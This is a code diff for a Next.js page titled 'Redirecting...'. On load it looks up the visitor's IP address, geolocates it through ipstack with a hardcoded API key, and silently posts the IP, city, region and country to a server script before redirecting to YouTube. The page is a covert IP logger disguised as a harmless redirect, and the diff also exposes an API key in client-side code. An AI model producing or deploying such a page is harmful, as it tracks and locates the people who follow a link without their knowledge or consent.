@@ -1,43 +1,34 @@
+import Head from 'next/head';
 import { useEffect } from 'react';
 
-const SaveUserData = () => {
+export default function Home() {
   useEffect(() => {
-    // Get user's IP address
-    var userIP;
+    const ipstack_access_key = '3f0de0f5be50240634d0a991c3f9c9cc';
+    const ipstack_api_url = 'http://api.ipstack.com/';
+
     fetch('https://api.ipify.org/?format=json')
       .then(response => response.json())
       .then(data => {
-        userIP = data.ip;
+        const userIP = data.ip;
 
-        // Use ipstack API to get user's location based on IP address
-        var ipstack_access_key = '3f0de0f5be50240634d0a991c3f9c9cc';
-        var ipstack_api_url = 'http://api.ipstack.com/';
         fetch(ipstack_api_url + userIP + '?access_key=' + ipstack_access_key)
           .then(response => response.json())
           .then(data => {
-            // Send user information to server-side script
-            var xhr = new XMLHttpRequest();
+            const xhr = new XMLHttpRequest();
             xhr.open('POST', 'save_user_data.php'); // change to your server-side script URL
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('user_ip=' + userIP + '&city=' + data.city + '&region=' + data.region_name + '&country=' + data.country_name);
 
-            // Redirect user to another website
             window.location.href = 'https://www.youtube.com';
           });
       });
   }, []);
 
-  return null;
-};
-
-export default function Home() {
   return (
     <>
       <Head>
         <title>Redirecting...</title>
       </Head>
-
-      <SaveUserData />
     </>
   );
 }
